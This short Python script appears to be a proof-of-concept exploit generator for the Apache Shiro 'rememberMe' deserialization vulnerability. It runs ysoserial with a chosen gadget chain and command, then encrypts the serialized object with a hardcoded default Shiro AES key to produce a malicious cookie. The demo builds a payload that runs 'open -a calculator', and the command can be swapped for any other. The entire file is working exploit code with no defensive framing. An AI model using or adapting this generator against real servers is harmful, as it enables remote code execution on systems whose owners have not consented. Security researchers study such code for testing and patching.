# -*- coding: utf-8 -*-
# @Author  : P2hm1n
# @Software: PyCharm
# @Blog    ：https://p2hm1n.com/

import base64
import uuid
import subprocess
from Crypto.Cipher import AES

# 填入 yso 路径
YSO_FILE = ''
key = "kPH+bIxk5D2deZiIxcaaaA=="


def poc(gadget, cmd):
    popen = subprocess.Popen(['java', '-jar', YSO_FILE, gadget, cmd], stdout=subprocess.PIPE)
    yso_exp = popen.stdout.read()
    return generator(key, yso_exp)


def generator(key, base64_yso_exp):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(base64_yso_exp)
    base64_ciphertext = str(base64.b64encode(iv + encryptor.encrypt(file_body)), "utf-8")
    return base64_ciphertext


if __name__ == "__main__":
    print(poc('CommonsCollections2', 'open -a calculator'))